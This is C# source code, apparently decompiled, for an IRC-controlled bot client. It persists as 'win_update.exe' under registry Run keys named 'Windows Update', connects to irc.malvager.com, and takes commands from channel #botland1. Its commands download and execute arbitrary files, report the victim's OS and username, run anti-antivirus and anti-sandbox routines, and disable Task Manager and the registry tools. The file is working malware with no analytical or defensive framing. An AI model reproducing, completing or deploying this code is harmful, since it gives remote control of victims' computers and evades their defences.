using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class ircbot
{
	public static readonly Random R = new Random();

	public static readonly string Rand1 = Conversions.ToString(R.Next(100000)) + "update.exe";

	public static readonly string Randnick = Conversions.ToString(R.Next(100000));

	public const string USER = "USER go go gadget go :gay";

	public static string NICK = "[" + Environment.MachineName.ToString() + "]" + Randnick.ToString();

	public static int PORT = Conversions.ToInteger("6667");

	public static string CHANNEL = "#botland1";

	public static string SERVER = "irc.malvager.com";

	public static string ircLine;

	public static NetworkStream IRCstream;

	public static TcpClient irc;

	public static string inputLine;

	public static StreamReader IRCreader;

	public static StreamWriter IRCwriter;

	public static void Main(string[] args)
	{
		try
		{
			if (!File.Exists(Path.GetTempPath() + "win_update.exe"))
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, Path.GetTempPath() + "win_update.exe");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Windows Update", Path.GetTempPath() + "win_update.exe");
			registryKey.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue("Windows Update", Path.GetTempPath() + "win_update.exe");
			registryKey2.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			irc = new TcpClient(SERVER, PORT);
			IRCstream = irc.GetStream();
			IRCreader = new StreamReader(IRCstream);
			IRCwriter = new StreamWriter(IRCstream);
			IRCwriter.WriteLine("USER go go gadget go :gay");
			IRCwriter.Flush();
			IRCwriter.WriteLine("NICK " + NICK);
			IRCwriter.Flush();
			while (true)
			{
				if (Inline(ref inputLine, IRCreader.ReadLine()) != null)
				{
					if (inputLine.Contains("PING :"))
					{
						int startIndex = inputLine.IndexOf("PING :");
						string text = new string(Conversions.ToCharArrayRankOne(inputLine.Substring(startIndex)));
						string text2 = new string(Conversions.ToCharArrayRankOne(text.Replace("PING :", string.Empty)));
						IRCwriter.WriteLine("PONG :" + text2);
						IRCwriter.Flush();
					}
					IRCwriter.WriteLine("JOIN " + CHANNEL);
					IRCwriter.Flush();
					if (inputLine.EndsWith("!dl"))
					{
						try
						{
							WebClient webClient = new WebClient();
							int startIndex2 = inputLine.IndexOf("http://");
							string text3 = inputLine.Substring(startIndex2);
							webClient.DownloadFile(text3.Replace(" !dl", string.Empty), Path.GetTempPath() + Rand1);
							ProcessStartInfo startInfo = new ProcessStartInfo(Path.GetTempPath() + Rand1);
							Process.Start(startInfo);
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " : \u00039 downloaded and executed in : " + Path.GetTempPath() + Rand1);
							IRCwriter.Flush();
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " :\u00037 error : " + ex2.ToString());
							IRCwriter.Flush();
							ProjectData.ClearProjectError();
						}
					}
					if (inputLine.EndsWith("!infos"))
					{
						try
						{
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " : \u00039 My OS is : " + Environment.OSVersion.ToString() + ", My Username is :  " + Environment.UserName.ToString() + " , and my uptime in seconds is : " + Environment.Version.ToString());
							IRCwriter.Flush();
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception ex4 = ex3;
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " :\u00037 error : " + ex4.ToString());
							IRCwriter.Flush();
							ProjectData.ClearProjectError();
						}
					}
					if (inputLine.EndsWith("!killav"))
					{
						try
						{
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " : \u0003killes AV succesfully");
							Antis.antiKAV();
							Antis.AntiWireShark();
							Antis.antiSandboxie();
							Antis.antiAnubis();
							Antis.antiAnubis2();
							Antis.AntiVirtualBox();
							Antis.AntiVmWare();
							Antis.AntiVirtualPC();
							IRCwriter.Flush();
						}
						catch (Exception ex5)
						{
							ProjectData.SetProjectError(ex5);
							Exception ex6 = ex5;
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " :\u00037 error : " + ex6.ToString());
							IRCwriter.Flush();
							ProjectData.ClearProjectError();
						}
					}
					if (inputLine.EndsWith("!limit"))
					{
						try
						{
							Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
							Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " : \u0003succeeded");
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7);
							Exception ex8 = ex7;
							IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " :\u00037 error : " + ex8.ToString());
							IRCwriter.Flush();
							ProjectData.ClearProjectError();
						}
					}
				}
				else
				{
					IRCwriter.Close();
					IRCwriter.Close();
					irc.Close();
				}
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			IRCwriter.WriteLine("PRIVMSG " + CHANNEL + " :\u00037 error : " + ex10.ToString());
			IRCwriter.Flush();
			Thread.Sleep(2000);
			string[] args2 = new string[0];
			Main(args2);
			ProjectData.ClearProjectError();
		}
	}

	public static T Inline<T>(ref T target, T value)
	{
		target = value;
		return value;
	}
}
